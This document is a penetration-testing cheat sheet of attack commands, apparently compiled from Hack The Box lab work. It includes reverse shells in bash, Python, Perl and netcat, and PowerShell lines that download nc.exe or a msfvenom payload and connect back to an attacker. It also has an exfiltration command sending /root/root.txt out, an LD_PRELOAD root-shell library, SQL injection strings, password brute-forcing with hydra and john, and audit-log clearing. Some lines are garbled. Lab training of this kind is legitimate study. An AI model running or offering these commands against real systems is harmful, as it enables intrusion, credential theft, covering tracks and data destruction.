wfuzz -c -w /usr/share/seclists/Usernames/Names/names.txt -d “username=FUZZ&password=pass” -hs “not found” http://10.10.10.10/login.php
wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ
wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ –hh 324
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/Apache.fuzz.txt -b PHPSESSID=096qe8a48h34hp3d3gfgr3cfr5 –hh 375 http://docker.hackthebox.eu:38821/panel.php?info=FUZZ
Fuzzing with ZAP
request -> right click –> attack –> fuzzer
==================================================================
Impacket
psexec.py administrator@10.10.10.10
### use case 1
./mssqlclient.py HOST/user1:pass1@10.10.10.1 -db volume -windows-auth
EXEC master..xp_dirtree '\\10.10.16.35\test'
responder -I tun0 -i 10.10.15.230
john -format=netntlmv2 hash --wordlist=/usr/share/wordlists/rockyou.txt
./mssqlclient.py HOST/user2:pass2@10.10.10.1 -db volume -windows-auth
xp_cmdshell powershell Invoke-WebRequest http://10.10.10.2:8000/file.exe -OutFile c:\Users\mssql-svc\Downloads\file1.exe
enable_xp_cmdshell
RECONFIGURE
xp_cmdshell powershell Invoke-WebRequest http://10.10.14.90:8000/nc.exe -OutFile c:\Users\mssql-svc\Downloads\nc.exe
xp_cmdshell c:\Users\mssql-svc\Downloads\nc.exe nc.exe 192.168.100.113 4444 –e cmd.exe
dir Groups.xml /s
gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/asdasdasdasdasdasdasd
====================================================================
Various commands
type
get-content 
dir /ah
whoami
dir /s
where /r c:\Windows bash.*
START filenae.lnk
where /r c:\ wsl.conf
### Download and run reverse shell
powershell "Invoke-WebRequest 'http://10.10.14.63:8000/nc.exe' -OutFile 'C:\Users\public\nc.exe'"; C:\Users\public\nc.exe -e cmd 10.10.14.63 8888
How to download file
wget
wget http://10.10.18.70:8000/taskkill.exe -OutFile taskkill.exe 
Invoke-WebRequest
Invoke-WebRequest http://10.10.18.70:8000/taskkill.exe -OutFile taskkill.exe
Certutil
certutil.exe -urlcache -split -f http://10.10.10.10/file.xml file.xml
Manage services
Restart-Service -Name “Ubiquiti UniFi Video”
Stop-Service -Name “Ubiquiti UniFi Video”
Clear Logs
auditpol /clear /y
==============================================================
Firewall source port scan, found port 987 and bind to localhost.

/usr/bin/nmap 192.168.5.2 -Pn –source-port=53 -f
/usr/bin/ncat -l 678 –sh-exec “ncat 192.168.5.2 987 -p 53”
ssh dave@localhost -p 678
=====================================================
#www server
python -m SimpleHTTPServer 8000
#on our kali machine we run:
nc -lvnp 7734
#On the victim machine we run:
sudo wget –post-file=/root/root.txt 10.10.14.4:7734
#curl download
curl http://some.url –output some.file
#Sort
ls -ltr
#wrap ps commands
ps auxww
#remove all before
cat lists |sed  ’s/^.*://’ > md5
awk -F “:” ‘{print $1}’ /etc/passwd
#capabilities
getcap -r / 2>/dev/null
#grep recursive
grep -RIlm1 "bash" $(pwd)
#sticky bit
find / -perm -1000 -type d -exec la -la {} \; 2>/dev/null
#sgid chmod 2000
find / -perm -g=s -type f -exec ls -la {} \; 2>/dev/null
#SUID chmod 4000
find / -perm -u=s -type f -exec ls -la {} \; 2>/dev/null
find / -user root -perm -o=w -type f -not -path "/proc/*" -exec ls -la {} \; 2>/dev/null
find / -type f -perm -g=rw -user root
apt install mpack munpack Receipt.eml
ltrace
system packets manager
apt-cache search showmount
upload to ftp
curl -T hi.asp ftp://10.10.10.116 --user anonymous:anonymous
download all files from ftp
wget --no-passive-ftp -m ftp://anonymous:anonymous@10.10.10.1
===================================================================
Ping
#!/bin/bash
echo “first three octets of network to scan, end with a .”
read network
for host in {1..254}; do
    ping -c1 $network$host &>/dev/null;
    [ $? -eq 0 ] && echo “$network$host is up”
 echo “done checking host: “ $network$host
done

Portscan
#!/bin/bash
echo “host to portscan: “
read host
for port in {1..65000}; do
    (echo > /dev/tcp/$host/$port) &>/dev/null
    [ $? -eq 0 ] && echo “$port open”
done
===================================================================
vhost enumeration
nmap --script http-vhosts -p 80,443 10.10.10.113
nmap --script dns-brute domain.pl
git clone https://github.com/jobertabma/virtual-host-discovery
ruby scan.rb --ip=10.10.10.1 --host=domein.ltd -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-20000.txt
nmap --script dns-brute friendzone.red
Domain transfer
dig +nocmd axfr @10.10.10.1 example.com +noall +answer
=====================================================================
Jxplorer GUI ldap program
jxplorer
ldapsearch
ldapsearch -x -h 10.10.10.107 -s base -b ‘dc=hackthebox,dc=htb’
ldapsearch -x -h 10.10.10.107 -s sub -b ‘dc=hackthebox,dc=htb’
======================================================================
hash analyzer
https://www.tunnelsup.com/hash-analyzer/ https://www.dcode.fr/tools-list#cryptography https://hashkiller.co.uk/Cracker/MD5 https://crackstation.net/
shells
https://github.com/flozz/p0wny-shell
https://github.com/tennc/webshell/blob/master/asp/webshell.asp
enumeration
https://github.com/diego-treitos/linux-smart-enumeration
tools
https://gtfobins.github.io/
https://github.com/dostoevskylabs/dostoevsky-pentest-notes
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
https://github.com/pentestmonkey/unix-privesc-check
https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
https://www.rebootuser.com/?p=1623
https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
https://guif.re/linuxeop
https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_-_linux.html
http://pentestmonkey.net/category/cheat-sheet
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
https://www.hackingarticles.in/linux-privilege-escalation-via-automated-script/
https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/
https://ahmedjouini.wordpress.com/ http://blog.kaiposecurity.nl/hackthebox-bastard/ https://github.com/1N3/PrivEsc/tree/master/linux
check file
https://nodistribute.com/
https://www.hackingarticles.in/penetration-testing/
https://null-byte.wonderhowto.com/how-to/push-and-pull-remote-files-securely-over-ssh-with-pipes-0133407/
===============================================================
#ssh user enum
search enumusers
use
options
set USER_FILE
run
#php, image reverse shell #php4,php5
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.1 lport=8888 -f raw
msfconsole
handler -p php/meterpreter/reverse_tcp -P 8888 -H 192.168.0.1
===============================================================
nmap -sC -sV -oA nmap/hostname ip
nmap -c -v -max-retires=0 -t5 -p- 10.10.10.10
nmap –script smb-brute.nse -p445 ip
nmap -n -T4 -sS -sV -sC -oA nmap/hostname ip
nmap -v -sS -p- -A -T4 -oA nmap/hostname ip
nmap -v -sU -sS -p- -A -T4 -oA nmap/hostname ip
nmap -p 80 --script http-shellshock --script-args uri=/cgi-bin/vulnscript.sh ip
nmap -p 3306 --script mysql-brute ip
nmap -sV --script=http-enum ip
nmap -sV --script=nfs-showmount ip
nmap -sV --script ssl-enum-ciphers -p 443 ip
nmap -p445 --script smb-vuln-ms17-010 ip
nmap --script smb-brute.nse -p445 ip
nmap -p 389 --script ldap-search -Pn 10.10.10.107
#### masscan
masscan -p1-65535,U:1-65535 10.10.10.116 --rate=1000 -e tun0
=================================================================
https://github.com/glv2/bruteforce-salted-openssl
check remote ssl
openssl s_client -connect wp.pl
local check
openssl x509 -in 1000.pem -text -noout
=================================================================`
#john
john –format=crypt –wordlist=rockyou.txt –session=two hashes.txt
john –format=NT –rules -w=/usr/share/wordlists/rockyou.txt hashfile.txt
john –format=netntlmv2 hash.txt –wordlist=/usr/share/wordlists/rockyou.txt
#hydra
hydra -l admin docker.hackthebox.eu -s 44661 -P /usr/share/wordlists/rockyou.txt http-post-form ‘/index.php:password=^PASS^:F=Invalid password!’
hydra -L users -P passwords 10.10.10.111 ssh
hydra 10.10.10.153 http-post-form “/moodle/login/index.php:username=^USER^&password=^PASS^:F=Invalid login, please try again” -l giovanni -P list -t 10 -w 30
hash-identifier
#hydra ssh
hydra -l sammy -P rockyou.txt 10.10.10.76 -t 4 -s 22022 ssh
#hydra phpmyadm
hydra 10.10.10.1 -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/UserPassCombo-Jay.txt http-post-form “/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1&target=index.php&token=570a7d8df35aeff09d15af220bced43d:F=Access denied” -V
#create words list from site
cewl wp.pl
#convert to upper
cat list | awk ‘{print toupper($0)}’
#convert to lower
cat list | awk ‘{print tolower($0)}’
Hatch
git clone https://github.com/nsgodshall/Hatch.git
============================================================
Privilege escalation - libseclogin
Dec 17, 2018
1 min read
touch libseclogin.c

#include 
#include 
#include 
#include 
void seclogin()
{
        setuid(0);
        setgid(0);
        execl(“/bin/bash”,“sh”,(char *)0);
}
int main(void)
{
        seclogin();
}

Compile the code with
/usr/share/bash-completion/completions/gcc -shared -o libseclogin.so -fPIC libseclogin.c
cp libseclogin.so to /tmp
cd /etc/ld.so.conf.d
ldconfig test.conf
#(test.conf write /tmp) #it will give this output
/sbin/ldconfig.real: relative path `test.conf’ used to build cache
env LD_LIBRARY_PATH=/tmp LD_PRELOAD=/tmp/libseclogin.so strace echo ‘s3cur3l0g1n’ | /usr/bin/myexec
Second run:
cat exploit.c
#include 
seclogin() {
setgid(0);
setuid(0);
system(“/bin/bash”);
}
gcc -fPIC -shared -o libseclogin.so exploit.c
Goal is to replace: /home/genevieve/.exploit/libseclogin.so -> /usr/lib/libseclogin.so
cd /etc/ld.so.conf.d touch exploit.conf cat exploit.conf /home/genevieve/.exploit/ ldconfig
./myexec
========================================================================
cat users.txt | python -m json.tool
python -m SimpleHTTPServer 8000
from subprocess import call
call('cat /root/root.txt > /tmp/output', shell=True)

from subprocess import call
call('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.132 5555 >/tmp/f', shell=True)
==========================================================================
smbclient
#user % hash
smbclient  -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -W YPUFFY -L 10.10.10.107
smbclient -L //10.10.10.1/
#Allow to login to smb share
smbclient  -U alice1978%0B186E661BBDBDCF6047784DE8B9FD8B --pw-nt-hash -W YPUFFY   \\\\10.10.10.107\\alice
smbmap
smbmap -H 10.10.10.10 -u test -p 'test' -d domain.com
smbmap -H 10.10.10.10 -u test -p 'test' -d domain.com -R
smbmap -H 10.10.10.10 -u test -p 'test' -d domain.com --download file
crackmapexec
crackmapexec ypuffy.htb -u alice1978 -H 0B186E661BBDBDCF6047784DE8B9FD8B –shares
Nmap
nmap -T4 -v -oA shares –script smb-enum-shares –script-args smbuser=username,smbpass=password -p445 10.10.10.123
============================================================================
#sql injection
userName = Smith’ or ‘1’=‘1
userName =’ or 1=1 –
userID = 1234567 or 1=1
UserName = Smith’;drop table users; truncate audit_log;–
User’+’
Themole
=========================================================
#putty
puttygen my_private_key.ppk -O private-openssh -o keyfile
#ssh
ssh -i keyfile root@10.10.10.107
doas -u userca /usr/bin/ssh-keygen -v -s /home/userca/ca -I alice1978 -n emergencybackup -V +1w -z 1 id_rsa.pub
===========================================================
export PATH=/bin:/usr/bin:/usr/sbin:/sbin:$PATH
export SHELL=/bin/bash
tar cf /dev/null testfile --checkpoint=1 --checkpoint-action=exec=/bin/bash  
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c import pty; pty.spawn("/bin/bash")
python3 -c import pty; pty.spawn('/bin/bash')
echo os.system('/bin/bash')
/bin/sh -i
echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
python /tmp/asdf.py
=======================================================================
Shell escape
export PATH=/bin:/usr/bin:/usr/sbin:/sbin:$PATH
export SHELL=/bin/bash
tar cf /dev/null ~/b –checkpoint=1 –checkpoint-action=exec=/bin/bash
===============================================================
Shell reverse
python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.10.10.10”,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,“-i”]);’
perl -e ‘use Socket;$i=“10.10.10.10”;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,“>&S”);open(STDOUT,“>&S”);open(STDERR,“>&S”);exec(“/bin/sh -i”);};’
nc -e /bin/sh 10.0.0.1 1234
reverse
bash -i >& /dev/tcp/192.168.100.113⁄443 0>&1
’/bin/bash -c ‘bash -i >& /dev/tcp/192.168.122.1⁄2323 0>&1’
listen
nc -lvp 443
nc -lp 1>/tmp/b
ipv6
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | \n\c -6 -l 6677 > /tmp/f;
nc -6 localhost 6677
bypass to run powershell scripts
powershell -ExecutionPolicy ByPass -File GetCLSID.ps1
powershell -ExecutionPolicy ByPass -File MakeREADME.ps1
REgistry search
reg query HKEY_CLASSES_ROOT\CLSID\ /s /F "DCOM"
case upload nc and connect
powershell "Invoke-WebRequest 'http://10.10.12.231:8000/nc.exe' -OutFile 'C:\Users\public\nc.exe'; C:\Users\public\nc.exe -e cmd 10.10.15.149 9000

case upload msvenom file and connect
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.12.231 LPORT=9000 -f exe -o A.exe
powershell "Invoke-WebRequest 'http://10.10.12.231:8000/A.exe' -OutFile 'A.exe'"; C:\Users\public\A.exe -e cmd 10.10.15.149 9000
=========================================================================
Sqlmap
–dbs
–tables -D
–columns -D master -T sys.master_key_passwords
–dump -D master -T sys.master_key_passwords
-f -b –current-db –current-user –users –passwords -v 1
sqlmap -u http://10.10.10.104/mvc/Product.aspx?ProductSubCategoryId=1 –sql-query=“EXEC master..xp_dirtree ‘\\10.10.18.70\test’ – “
=============================================================================
Steghide
steghide info file
steghide export -sf file.jpg  
Foremost
foremost -i file
Strings
strings file
Binwalk
binwalk file
binwalk -e file
Stegsolve 
https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve
Wavsteg
python3 WavSteg.py -r -s soundfile -o outputfile
Stegcracker
./stegcracker ../../Hackthebox/Stego/beatles/BAND.JPG ../../app/rockyou.txt
Unicode
https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder
Nipiet online
https://www.bertnase.de/npiet/npiet-execute.php
Decode online
http://dcode.fr
=============================================================================
gobuster -u http://10.10.10.111:1880 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster -u http://10.10.10.111:9999/backup -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
#with -x -m it will be search txt,html
gobuster -u http://10.10.10.111/dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -x -m
gobuster -u http://10.10.10.111/dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -x html
Recirsive Gobuster https://github.com/epi052/recursive-gobuster
Skipfish is an active web application security reconnaissance tool. skipfish -o /root/test/ -S /usr/share/skipfish/dictionares
Uniscan is a simple Remote File Include, Local File Include and Remote Command Execution vulnerability scanner. niscan -u http://test.com -q
WPscan wpscan -u http://test.com –enumerate vp
Burp
ZAPproxy
Acunetix WebScanner
Padbuster Padding Oracle padbuster http://docker.hackthebox.eu:38935/profile.php E6se1KiwhfwpRU2iF9z91QIcAYQND6%2FYRRZC%2FCP8LSo%2BQp2sgcDWcQ== 8 –cookies iknowmag1k=E6se1KiwhfwpRU2iF9z91QIcAYQND6%2FYRRZC%2FCP8LSo%2BQp2sgcDWcQ== padbuster http://docker.hackthebox.eu:39110/profile.php E6se1KiwhfwpRU2iF9z91QIcAYQND6%2FYRRZC%2FCP8LSo%2BQp2sgcDWcQ== 8 –cookies iknowmag1k=E6se1KiwhfwpRU2iF9z91QIcAYQND6%2FYRRZC%2FCP8LSo%2BQp2sgcDWcQ== –plaintext=“{\“user\”:\“odmin\“,\“role\”:\“admin\“}”
============================================





